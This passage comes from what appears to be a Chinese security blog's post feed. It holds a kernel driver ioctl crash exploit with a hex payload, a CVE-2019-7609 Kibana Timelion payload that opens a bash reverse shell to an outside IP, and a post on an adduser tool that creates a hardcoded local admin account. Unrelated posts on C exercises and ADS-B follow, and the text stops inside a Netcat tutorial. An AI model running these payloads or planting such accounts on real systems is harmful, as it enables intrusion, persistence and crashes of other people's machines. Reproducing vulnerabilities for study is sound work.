class="number">0x05055800</span>,</span><br><span class="line">    <span class="number">0xed69b7d5</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x0107ebbd</span>,</span><br><span class="line">    <span class="number">0xd214af8d</span>,</span><br><span class="line">    <span class="number">0xffff4a93</span>,</span><br><span class="line">    <span class="number">0x26450008</span>,</span><br><span class="line">    <span class="number">0x58df0000</span>,</span><br><span class="line">    <span class="number">0xd16db084</span>,</span><br><span class="line">    <span class="number">0x03ff30dd</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x209aff3b</span>,</span><br><span class="line">    <span class="number">0xe7850800</span>,</span><br><span class="line">    <span class="number">0x00000002</span>,</span><br><span class="line">    <span class="number">0x30da815c</span>,</span><br><span class="line">    <span class="number">0x426f5105</span>,</span><br><span class="line">    <span class="number">0x0de109d7</span>,</span><br><span class="line">    <span class="number">0x2c1a65fc</span>,</span><br><span class="line">    <span class="number">0xfcb3d75f</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x8066be5b</span>,</span><br><span class="line">    <span class="number">0x00000002</span>,</span><br><span class="line">    <span class="number">0xffffffff</span>,</span><br><span class="line">    <span class="number">0x5cf232ec</span>,</span><br><span class="line">    <span class="number">0x680d1469</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x00000020</span>,</span><br><span class="line">    <span class="number">0xffffffff</span>,</span><br><span class="line">    <span class="number">0x00000400</span>,</span><br><span class="line">    <span class="number">0xd1d12be8</span>,</span><br><span class="line">    <span class="number">0x02010200</span>,</span><br><span class="line">    <span class="number">0x01ffc16f</span>,</span><br><span class="line">    <span class="number">0xf6e237e6</span>,</span><br><span class="line">    <span class="number">0x007f0000</span>,</span><br><span class="line">    <span class="number">0x01ff08f8</span>,</span><br><span class="line">    <span class="number">0x000f00f9</span>,</span><br><span class="line">    <span class="number">0xbad07695</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0xbaff0000</span>,</span><br><span class="line">    <span class="number">0x24040040</span>,</span><br><span class="line">    <span class="number">0x00000006</span>,</span><br><span class="line">    <span class="number">0x00000004</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0xbc2e9242</span>,</span><br><span class="line">    <span class="number">0x009f5f08</span>,</span><br><span class="line">    <span class="number">0x00800000</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0xff8800ff</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x000003f4</span>,</span><br><span class="line">    <span class="number">0x6faa8472</span>,</span><br><span class="line">    <span class="number">0x00000400</span>,</span><br><span class="line">    <span class="number">0xec857dd5</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x00000040</span>,</span><br><span class="line">    <span class="number">0xffffffff</span>,</span><br><span class="line">    <span class="number">0x3f004874</span>,</span><br><span class="line">    <span class="number">0x0000b77a</span>,</span><br><span class="line">    <span class="number">0xec9acb95</span>,</span><br><span class="line">    <span class="number">0xfacc0001</span>,</span><br><span class="line">    <span class="number">0xffff0001</span>,</span><br><span class="line">    <span class="number">0x0080ffff</span>,</span><br><span class="line">    <span class="number">0x3600ff03</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x8fff7d7f</span>,</span><br><span class="line">    <span class="number">0x6b87075a</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x001001ff</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0xff1f0512</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x51e32167</span>,</span><br><span class="line">    <span class="number">0xc18c55cc</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0xffffffff</span>,</span><br><span class="line">    <span class="number">0xb4aaf12b</span>,</span><br><span class="line">    <span class="number">0x86edfdbd</span>,</span><br><span class="line">    <span class="number">0x00000010</span>,</span><br><span class="line">    <span class="number">0x0000003f</span>,</span><br><span class="line">    <span class="number">0xabff7b00</span>,</span><br><span class="line">    <span class="number">0xffff9ea3</span>,</span><br><span class="line">    <span class="number">0xb28e0040</span>,</span><br><span class="line">    <span class="number">0x000fffff</span>,</span><br><span class="line">    <span class="number">0x458603f4</span>,</span><br><span class="line">    <span class="number">0xffff007f</span>,</span><br><span class="line">    <span class="number">0xa9030f02</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x002cffff</span>,</span><br><span class="line">    <span class="number">0x9e00cdff</span>,</span><br><span class="line">    <span class="number">0x00000004</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x41414141</span> &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> fd = <span class="number">0</span>;</span><br><span class="line">        fd = open(driver, O_RDWR);</span><br><span class="line">        <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Failed to open %s, with errno %d\n&quot;</span>, driver, errno);</span><br><span class="line">            system(<span class="string">&quot;echo 1 &gt; /data/local/tmp/log&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Try open %s with command 0x%x.\n&quot;</span>, driver, command);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;System will crash and reboot.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(ioctl(fd, command, &amp;payload) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Allocation of structs failed, %d\n&quot;</span>, errno);</span><br><span class="line">            system(<span class="string">&quot;echo 2 &gt; /data/local/tmp/log&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 硬件漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE复现 </tag>
            
            <tag> 内核漏洞 </tag>
            
            <tag> 亚马逊 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2019-7609-kibana&lt;6.6.0未授权远程代码命令执行</title>
      <link href="2021/01/17/CVE-2019-7609-kibana%E4%BD%8E%E4%BA%8E6.6.0%E6%9C%AA%E6%8E%88%E6%9D%83%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
      <url>2021/01/17/CVE-2019-7609-kibana%E4%BD%8E%E4%BA%8E6.6.0%E6%9C%AA%E6%8E%88%E6%9D%83%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>该文章为转载总结文章，如有侵权，请联系<a href="mailto:&#x4a;&#x6f;&#x43;&#97;&#x74;&#x57;&#70;&#x59;&#x40;&#x31;&#x36;&#x33;&#46;&#x63;&#x6f;&#x6d;">&#x4a;&#x6f;&#x43;&#97;&#x74;&#x57;&#70;&#x59;&#x40;&#x31;&#x36;&#x33;&#46;&#x63;&#x6f;&#x6d;</a></p><h2 id="CVE-2019-7609-kibana-lt-6-6-0未授权远程代码命令执行"><a href="#CVE-2019-7609-kibana-lt-6-6-0未授权远程代码命令执行" class="headerlink" title="CVE-2019-7609-kibana&lt;6.6.0未授权远程代码命令执行"></a>CVE-2019-7609-kibana&lt;6.6.0未授权远程代码命令执行</h2><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>将POC里的反链IP地址换成自己的，然后在目标机器上的 <code>Timelion</code> 选项下将以下 <code>POC</code> 粘贴进去，然后点击 <code>Run</code> 运行：  </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.es(*).props(label.__proto__.env.AAAA&#x3D;&#39;require(&quot;child_process&quot;).exec(&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.20.166&#x2F;8989 0&gt;&amp;1&quot;);process.exit()&#x2F;&#x2F;&#39;)</span><br><span class="line">.props(label.__proto__.env.NODE_OPTIONS&#x3D;&#39;--require &#x2F;proc&#x2F;self&#x2F;environ&#39;)   </span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/17/g7uZ3zLAVN48WvK.jpg" alt="Timelion.jpg">  </p><p>然后自己机器开启监听，再点击 <code>Canvas</code> 即可出发漏洞。<br><img src="https://i.loli.net/2021/01/17/X6yewBUgOrCsMYx.jpg" alt="Canvas.jpg">   </p>]]></content>
      
      
      <categories>
          
          <category> Web渗透 </category>
          
          <category> CVE复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> POC </tag>
            
            <tag> CVE-2019-7609 </tag>
            
            <tag> 日志分析平台 </tag>
            
            <tag> 未授权远程代码命令执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>adduser 单文件添加用户</title>
      <link href="2021/01/17/adduser%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7/"/>
      <url>2021/01/17/adduser%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>该文章为转载总结文章，如有侵权，请联系<a href="mailto:&#74;&#111;&#67;&#x61;&#x74;&#x57;&#70;&#89;&#64;&#x31;&#54;&#51;&#x2e;&#x63;&#x6f;&#x6d;">&#74;&#111;&#67;&#x61;&#x74;&#x57;&#70;&#89;&#64;&#x31;&#54;&#51;&#x2e;&#x63;&#x6f;&#x6d;</a></p><h3 id="adduser-单文件添加用户"><a href="#adduser-单文件添加用户" class="headerlink" title="adduser 单文件添加用户"></a>adduser 单文件添加用户</h3><blockquote><p>【内网渗透-创建Windows用户】  </p></blockquote><blockquote><p>Ps: net net1 等常见命令被过滤    </p></blockquote><p><img src="https://i.loli.net/2021/01/17/Sx1sOIV2ue96ckr.png" alt="adduser1.png"><br><img src="https://i.loli.net/2021/01/17/zWrUHb7VqcoiT6u.png" alt="adduser2.png"></p><blockquote><p>简介：adduser项目以编程方式创建“本地管理员” Windows用户。需要管理员权限。创建的用户被硬编码为以下内容：  </p></blockquote><blockquote><p>默认登录名：audit 密码：（Test123456789! ）<br><img src="https://i.loli.net/2021/01/17/bfmY9HqXjkpR5El.png" alt="adduser3.png"><br><img src="https://i.loli.net/2021/01/17/LPNK2GIo5fgEdCH.png" alt="adduser4.png">  </p></blockquote><blockquote><p><a href="https://github.com/newsoft/adduser/blob/master/adduser.c#L39">你可以在源码中自定义修改账号密码</a>  </p></blockquote><p><img src="https://i.loli.net/2021/01/17/Xb1Mx4hqtvGd6rA.png" alt="adduser5.png"> </p><blockquote><p>内容来自 <a href="https://twitter.com/jas502n/status/1214413798330601472">https://twitter.com/jas502n/status/1214413798330601472</a>  此处仅作学习保留</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Web渗透 </category>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web渗透 </tag>
            
            <tag> 内网渗透 </tag>
            
            <tag> 免杀 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言PTA练习及答案</title>
      <link href="2021/01/10/C%E8%AF%AD%E8%A8%80PTA%E7%BB%83%E4%B9%A0%E5%8F%8A%E7%AD%94%E6%A1%88/"/>
      <url>2021/01/10/C%E8%AF%AD%E8%A8%80PTA%E7%BB%83%E4%B9%A0%E5%8F%8A%E7%AD%94%E6%A1%88/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="C语言PTA练习及答案"><a href="#C语言PTA练习及答案" class="headerlink" title="C语言PTA练习及答案"></a>C语言PTA练习及答案</h1><p>最近在B站上重温了下浙江大学翁恺老师的C语言教程<br><img src="https://i.loli.net/2021/01/10/mftuJ6SBjxoD5Tv.png" alt="QQ截图20210110193528.png"><br>而在其中翁恺老师一直提到的PTA系统，我去找了后发现了这个网站<br><a href="https://pintia.cn/">https://pintia.cn/</a><br><img src="https://i.loli.net/2021/01/10/HGRhyijFQzOkfAE.png" alt="QQ截图20210110194005.png"><br>其中有浙大版《C语言程序设计（第3版）》题目集这个跟翁恺老师的课程比较符合，我就做了编程题到2-5题<br>我在此把我的答案分享出来，大家可以自取    </p><ol><li>练习2-1 Programming in C is fun! (5分) <a href="/download/C/%E7%BB%83%E4%B9%A02-1ProgramminginCisfun!(5%E5%88%86).c">点击下载</a></li><li>练习2-3 输出倒三角图案 (5分) <a href="/download/C/%E7%BB%83%E4%B9%A02-3%E8%BE%93%E5%87%BA%E5%80%92%E4%B8%89%E8%A7%92%E5%9B%BE%E6%A1%88(5%E5%88%86).c">点击下载</a></li><li>练习2-4 温度转换(5分) <a href="/download/C/%E7%BB%83%E4%B9%A02-3%E8%BE%93%E5%87%BA%E5%80%92%E4%B8%89%E8%A7%92%E5%9B%BE%E6%A1%88(5%E5%88%86).c">点击下载</a></li><li>练习2-6 计算物体自由下落的距离 (5分) <a href="/download/C/%E7%BB%83%E4%B9%A02-6%E8%AE%A1%E7%AE%97%E7%89%A9%E4%BD%93%E8%87%AA%E7%94%B1%E4%B8%8B%E8%90%BD%E7%9A%84%E8%B7%9D%E7%A6%BB(5%E5%88%86).c">点击下载</a></li><li>练习2-8 计算摄氏温度 (10分) <a href="/download/C/%E7%BB%83%E4%B9%A02-8%E8%AE%A1%E7%AE%97%E6%91%84%E6%B0%8F%E6%B8%A9%E5%BA%A6(10%E5%88%86).c">点击下载</a></li><li>练习2-9 整数四则运算 (10分) <a href="/download/C/%E7%BB%83%E4%B9%A02-9%E6%95%B4%E6%95%B0%E5%9B%9B%E5%88%99%E8%BF%90%E7%AE%97(10%E5%88%86).c">点击下载</a></li><li>练习2-10 计算分段函数1 (10分) <a href="/download/C/%E7%BB%83%E4%B9%A02-10%E8%AE%A1%E7%AE%97%E5%88%86%E6%AE%B5%E5%87%BD%E6%95%B0%5B1%5D(10%E5%88%86).c">点击下载</a></li><li>练习2-11 计算分段函数2 (10分) <a href="/download/C/%E7%BB%83%E4%B9%A02-11%E8%AE%A1%E7%AE%97%E5%88%86%E6%AE%B5%E5%87%BD%E6%95%B0%5B2%5D(10%E5%88%86).c">点击下载</a></li><li>练习2-12 输出华氏-摄氏温度转换表 (15分) <a href="/download/C/%E7%BB%83%E4%B9%A02-12%E8%BE%93%E5%87%BA%E5%8D%8E%E6%B0%8F-%E6%91%84%E6%B0%8F%E6%B8%A9%E5%BA%A6%E8%BD%AC%E6%8D%A2%E8%A1%A8(15%E5%88%86).c">点击下载</a></li><li>练习2-13 求N分之一序列前N项和 (15分) <a href="/download/C/%E7%BB%83%E4%B9%A02-13%E6%B1%82N%E5%88%86%E4%B9%8B%E4%B8%80%E5%BA%8F%E5%88%97%E5%89%8DN%E9%A1%B9%E5%92%8C(15%E5%88%86).c">点击下载</a></li><li>练习2-14 求奇数分之一序列前N项和 (15分) <a href="/download/C/%E7%BB%83%E4%B9%A02-14%E6%B1%82%E5%A5%87%E6%95%B0%E5%88%86%E4%B9%8B%E4%B8%80%E5%BA%8F%E5%88%97%E5%89%8DN%E9%A1%B9%E5%92%8C(15%E5%88%86).c">点击下载</a></li><li>练习2-15 求简单交错序列前N项和 (15分) <a href="/download/C/%E7%BB%83%E4%B9%A02-15%E6%B1%82%E7%AE%80%E5%8D%95%E4%BA%A4%E9%94%99%E5%BA%8F%E5%88%97%E5%89%8DN%E9%A1%B9%E5%92%8C(15%E5%88%86).c">点击下载</a></li><li>练习2-17 生成3的乘方表 (15分) <a href="/download/C/%E7%BB%83%E4%B9%A02-17%E7%94%9F%E6%88%903%E7%9A%84%E4%B9%98%E6%96%B9%E8%A1%A8(15%E5%88%86).c">点击下载</a></li><li>练习2-18 求组合数 (15分) <a href="/download/C/%E7%BB%83%E4%B9%A02-18%E6%B1%82%E7%BB%84%E5%90%88%E6%95%B0(15%E5%88%86).c">点击下载</a></li><li>习题2-1 求整数均值 (10分) <a href="/download/C/%E4%B9%A0%E9%A2%982-1%E6%B1%82%E6%95%B4%E6%95%B0%E5%9D%87%E5%80%BC(10%E5%88%86).c">点击下载</a></li><li>习题2-2 阶梯电价 (15分) <a href="/download/C/%E4%B9%A0%E9%A2%982-2%E9%98%B6%E6%A2%AF%E7%94%B5%E4%BB%B7(15%E5%88%86).c">点击下载</a></li><li>习题2-3 求平方与倒数序列的部分和 (15分) <a href="/download/C/%E4%B9%A0%E9%A2%982-3%E6%B1%82%E5%B9%B3%E6%96%B9%E4%B8%8E%E5%80%92%E6%95%B0%E5%BA%8F%E5%88%97%E7%9A%84%E9%83%A8%E5%88%86%E5%92%8C(15%E5%88%86).c">点击下载</a></li><li>习题2-4 求交错序列前N项和 (15分) <a href="/download/C/%E4%B9%A0%E9%A2%982-4%E6%B1%82%E4%BA%A4%E9%94%99%E5%BA%8F%E5%88%97%E5%89%8DN%E9%A1%B9%E5%92%8C(15%E5%88%86).c">点击下载</a></li><li>习题2-5 求平方根序列前N项和 (15分) <a href="/download/C/%E4%B9%A0%E9%A2%982-5%E6%B1%82%E5%B9%B3%E6%96%B9%E6%A0%B9%E5%BA%8F%E5%88%97%E5%89%8DN%E9%A1%B9%E5%92%8C(15%E5%88%86).c">点击下载</a>  </li></ol><p>———————–分割线—————————-</p>]]></content>
      
      
      <categories>
          
          <category> 编程学习 </category>
          
          <category> C语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程学习 </tag>
            
            <tag> C语言 </tag>
            
            <tag> PTA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ADS-B系统详解</title>
      <link href="2021/01/10/ADS-B%E7%B3%BB%E7%BB%9F%E8%AF%A6%E8%A7%A3/"/>
      <url>2021/01/10/ADS-B%E7%B3%BB%E7%BB%9F%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="ADS-B系统详解"><a href="#ADS-B系统详解" class="headerlink" title="ADS-B系统详解"></a>ADS-B系统详解</h1><p>最近心血来潮，入手了一款50元左右的小型sdr，型号为RTL2832U+R820T<br>购买链接我就不挂了，挂张图吧<br><img src="https://i.loli.net/2021/01/10/PQ26VyBDEXa4Rju.jpg" alt="IMG_20210110_184530.jpg"><br>也因此了解了下飞机中的ADS-B系统，发个博客写个学习过程</p><h2 id="ADS-B的解释"><a href="#ADS-B的解释" class="headerlink" title="ADS-B的解释"></a>ADS-B的解释</h2><p>ADS-B是广播式自动相关监视的英文缩写：<br>Automatic——自动，全天候运行，无需职守。<br>Dependent——相关，它只需要于依赖精确地全球卫星导航定位数据。<br>Surveillance——监视，监视（获得）飞机位置、高度、速度、航向、识别号和其它信息。<br>Broadcast——广播，无需应答，飞机之间或与地面站互相广播各自的数据信息。<br>ADS-B系统即广播式自动相关监视系统，由多地面站和机载站构成，以网状、多点对多点方式完成数据双向通信。它主要实施空对空监视。<br>一般情况下，只需机载电子设备（GPS接收机、数据链收发机及其天线、驾驶舱冲突信息显示器CDTI），不需要任何地面辅助设备即可完成相关功能，装备了ADS-B的飞机可通过数据链广播其自身的精确位置和其它数据（如速度、高度及飞机是否转弯、爬升或下降等）。ADS-B接收机与空管系统、其它飞机的机载ADS-B结合起来，在空地都能提供精确、实时的冲突信息。<br>ADS-B是一种全新科技，它将当今空中交通管制中的三大要素（通信、导航、监视）重新定义。<br>虽然系统也挺老的了，挂张图方便各位理解<br><img src="https://i.loli.net/2021/01/10/VpQEDu8FUPz9SbR.png" alt="3812b31bb051f81971373313d5b44aed2e73e75d.png">  </p><h2 id="SJ182航班的失事"><a href="#SJ182航班的失事" class="headerlink" title="SJ182航班的失事"></a>SJ182航班的失事</h2><p>最近看到的SJ182航班的失事也是令人痛心，而第一时间发现的就是雅加达附近的ADS-B 接收站，这里挂上失事的飞机的ADS-B数据<br><img src="https://i.loli.net/2021/01/10/YgucThf7FA6pjC3.jpg" alt="qq_pic_merged_1610276180934.jpg"><br><img src="https://i.loli.net/2021/01/10/mubSRIjrUk8LA1W.jpg" alt="qq_pic_merged_1610276191672.jpg"><br>可以看到飞机的航速迅速的下降..<br>R.I.P  </p><h2 id="ADS-B系统包括地面站和机载设备两部分；从应用功能的角度，可分为ADS-B发射（OUT）和接收（IN）两类。"><a href="#ADS-B系统包括地面站和机载设备两部分；从应用功能的角度，可分为ADS-B发射（OUT）和接收（IN）两类。" class="headerlink" title="ADS-B系统包括地面站和机载设备两部分；从应用功能的角度，可分为ADS-B发射（OUT）和接收（IN）两类。"></a>ADS-B系统包括地面站和机载设备两部分；从应用功能的角度，可分为ADS-B发射（OUT）和接收（IN）两类。</h2><h3 id="ADS-B-OUT"><a href="#ADS-B-OUT" class="headerlink" title="ADS-B OUT"></a>ADS-B OUT</h3><p>ADS-B OUT是指航空器向外发送信息，机载发射机以一定周期发送航空器的各种信息，包括:航空器识别码、位置、高度、速度、方向和爬升率等。OUT是机载ADS-B设备的基本功能，只要相关机载电子设备正常运行，ADS-B OUT系统一般无需飞行机组干预即可自动工作。 </p><h3 id="ADS-B-IN"><a href="#ADS-B-IN" class="headerlink" title="ADS-B IN"></a>ADS-B IN</h3><p>ADS-B IN是指航空器接收其他航空器发送的ADS-B OUT信息或地面服务设施发送的信息，为机组提供运行支持。ADS-B IN的一个典型应用是机组通过驾驶舱交通信息显示设备(CDTI)获知其他航空器的运行状况，从而提高机组的空中交通情景意识。</p><h2 id="ADS-B发送的飞行参数"><a href="#ADS-B发送的飞行参数" class="headerlink" title="ADS-B发送的飞行参数"></a>ADS-B发送的飞行参数</h2><p>飞行识别信息（航班号或呼号）<br>ICAO 24位飞机地址（全球唯一的机体代码）<br>位置（经纬度）<br>位置的完整性和精确性（GPS水平间隔限制）<br>气压高度及几何高度<br>垂直方向改变速率（爬升/下降率）<br>航迹角和地速<br>紧急情况指示（当选择了紧急代码后）<br>专门的位置识别信息（当选择了IDENT功能后）<br>而又因为现在的飞机都会选择这种方式，而这种方式是不经过加密的，所以我们可以通过我们的rtlsdr来接收它，这个我将在下篇博客讲</p><h2 id="ADS-B发送的数据的格式及通讯方式"><a href="#ADS-B发送的数据的格式及通讯方式" class="headerlink" title="ADS-B发送的数据的格式及通讯方式"></a>ADS-B发送的数据的格式及通讯方式</h2><p>具体格式，通讯方式请参考这篇文档<br><a href="https://wenku.baidu.com/view/47da6904cc17552707220823.html">https://wenku.baidu.com/view/47da6904cc17552707220823.html</a><br><img src="https://i.loli.net/2021/01/10/hevEuXz2p5YAo4T.png" alt="QQ截图20210110191455.png"><br><img src="https://i.loli.net/2021/01/10/9bPQpGhqI8NFYtf.png" alt="QQ截图20210110191533.png"><br><img src="https://i.loli.net/2021/01/10/BEtw142QJmRSrMq.png" alt="QQ截图20210110191542.png">  </p><h2 id="爱好者可以做的事"><a href="#爱好者可以做的事" class="headerlink" title="爱好者可以做的事"></a>爱好者可以做的事</h2><p>首先明确一点，在我国，一切有关无线电，频率等相关事项，请查询中华人民共和国无线电管理条例<br>网址：<a href="https://duxiaofa.baidu.com/detail?searchType=statute&amp;from=aladdin_28231&amp;originquery=%E4%B8%AD%E5%8D%8E%E4%BA%BA%E6%B0%91%E5%85%B1%E5%92%8C%E5%9B%BD%E6%97%A0%E7%BA%BF%E7%94%B5%E7%AE%A1%E7%90%86%E6%9D%A1%E4%BE%8B&amp;count=85&amp;cid=1a0feb82c3e98eda93f4402b97caeb42_law">https://duxiaofa.baidu.com/detail?searchType=statute&amp;from=aladdin_28231&amp;originquery=%E4%B8%AD%E5%8D%8E%E4%BA%BA%E6%B0%91%E5%85%B1%E5%92%8C%E5%9B%BD%E6%97%A0%E7%BA%BF%E7%94%B5%E7%AE%A1%E7%90%86%E6%9D%A1%E4%BE%8B&amp;count=85&amp;cid=1a0feb82c3e98eda93f4402b97caeb42_law</a>  </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">“第七十五条 违反本条例规定，有下列行为之一的，由无线电管理机构责令改正；拒不改正的，没收从事违法活动的设备，并处3万元以上10万元以下的罚款；造成严重后果的，并处10万元以上30万元以下的罚款：  </span><br><span class="line">（一）研制、生产、销售和维修大功率无线电发射设备，未采取有效措施抑制电波发射；  </span><br><span class="line">（二）境外组织或者个人在我国境内进行电波参数测试或者电波监测；  </span><br><span class="line">（三）向境外组织或者个人提供涉及国家安全的境内电波参数资料。”  </span><br></pre></td></tr></table></figure><p>这样一看大家就应该很明了，自己接收可以，请不要外传，造成不良后果都会被处罚！<br>而民航相关无线电信号均可默默的自己接收，然后默默的听一下或者看一看。不要外传！</p>]]></content>
      
      
      <categories>
          
          <category> 无线电 </category>
          
          <category> 知识干货 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 无线电 </tag>
            
            <tag> ADS-B </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络界的瑞士军刀——Netcat</title>
      <link href="2020/11/22/Netcat/"/>
      <url>2020/11/22/Netcat/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="网络界的瑞士军刀——NetCat"><a href="#网络界的瑞士军刀——NetCat" class="headerlink" title="网络界的瑞士军刀——NetCat"></a>网络界的瑞士军刀——NetCat</h1><h3 id="文章出自JoCat-QQ：1506610991-有渗透测试需求及商务合作请联系-x4a-x6f-x43-x61-x74-x57-70-89-64-49-54-x33-x2e-x63-111-x6d"><a href="#文章出自JoCat-QQ：1506610991-有渗透测试需求及商务合作请联系-x4a-x6f-x43-x61-x74-x57-70-89-64-49-54-x33-x2e-x63-111-x6d" class="headerlink" title="文章出自JoCat QQ：1506610991 有渗透测试需求及商务合作请联系&#x4a;&#x6f;&#x43;&#x61;&#x74;&#x57;&#70;&#89;&#64;&#49;&#54;&#x33;&#x2e;&#x63;&#111;&#x6d;"></a>文章出自JoCat QQ：1506610991 有渗透测试需求及商务合作请联系<a href="mailto:&#x4a;&#x6f;&#x43;&#x61;&#x74;&#x57;&#70;&#89;&#64;&#49;&#54;&#x33;&#x2e;&#x63;&#111;&#x6d;">&#x4a;&#x6f;&#x43;&#x61;&#x74;&#x57;&#70;&#89;&#64;&#49;&#54;&#x33;&#x2e;&#x63;&#111;&#x6d;</a></h3><h3 id="本文可能存在攻击性，请勿用于非法用途。仅用于技术交流，一切责任与本人无关，如有不足的地方希望指点"><a href="#本文可能存在攻击性，请勿用于非法用途。仅用于技术交流，一切责任与本人无关，如有不足的地方希望指点" class="headerlink" title="本文可能存在攻击性，请勿用于非法用途。仅用于技术交流，一切责任与本人无关，如有不足的地方希望指点"></a>本文可能存在攻击性，请勿用于非法用途。仅用于技术交流，一切责任与本人无关，如有不足的地方希望指点</h3><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>NETCAT被人们称为网络工具中的瑞士军刀，体积很小但功能强大。<br>它能通过TCP和UDP在网络中读写数据，在两台电脑之间建立链接并返回两个数据流。<br>通过NetCat可以做很多我们在平常渗透测试中需要做的事，今天我就来介绍下NetCat的基本玩法~ </p><h2 id="1-下载地址"><a href="#1-下载地址" class="headerlink" title="1.下载地址"></a>1.下载地址</h2><p>默认linux发行版都是自带netcat的<br>而我们在windows环境下一样可以使用netcat<br>下载地址如下<br><a href="https://github.com/diegocr/netcat">https://github.com/diegocr/netcat</a><br>配置一下环境变量我们就可以在cmd下直接使用啦<br><img src="https://i.loli.net/2020/11/21/zFqr3xuDTv1onyO.png" alt="QQ截图20201121224756.png"></p><h2 id="2-命令介绍"><a href="#2-命令介绍" class="headerlink" title="2.命令介绍"></a>2.命令介绍</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -help</span><br></pre></td></tr></table></figure><p>通过-help参数我们可以查看nc具有的功能，如图<br><img src="https://i.loli.net/2020/11/21/wN53TfU6meFoW7R.png" alt="QQ截图20201121225806.png"><br>下面为翻译结果  </p><figure class="highlight 